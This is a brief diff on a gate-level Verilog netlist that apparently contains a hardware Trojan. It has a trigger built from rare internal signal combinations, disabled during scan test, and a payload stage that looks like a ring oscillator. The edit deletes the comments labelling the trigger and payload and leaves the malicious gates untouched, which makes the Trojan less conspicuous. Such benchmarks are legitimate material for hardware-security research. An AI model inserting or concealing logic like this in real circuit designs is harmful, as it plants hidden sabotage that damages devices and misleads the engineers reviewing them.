@@ -1,4 +1,4 @@
-  // Trigger ---------
+
   NOR2X0 Trojan1 (.IN1(WX3442), .IN2(WX5974), .QN(Tj_OUT1));
   NOR2X0 Trojan2 (.IN1(WX806), .IN2(WX782), .QN(Tj_OUT2));
   NOR2X0 Trojan3 (.IN1(WX11632), .IN2(WX3102), .QN(Tj_OUT3));
@@ -14,7 +14,7 @@
   INVX0 INVtest_se ( .IN(test_se), .QN(test_se_NOT) );
   AND3X1 Trojan_Trigger (.IN1(Tj_OUT1234), .IN2(Tj_OUT5678), .IN3(test_se_NOT), .Q(Tj_Trigger) );
 
-  // Payload ---------
+
   NAND3X4 TjPayload1 ( .IN1(WX547), .IN2(Tj_Trigger), .IN3(Stage4), .QN(Stage1_1));
   INVX8 TjPayload2 ( .IN(Stage1_1), .QN(Stage1_2) );
   INVX8 TjPayload3 ( .IN(Stage1_2), .QN(Stage1_3) );
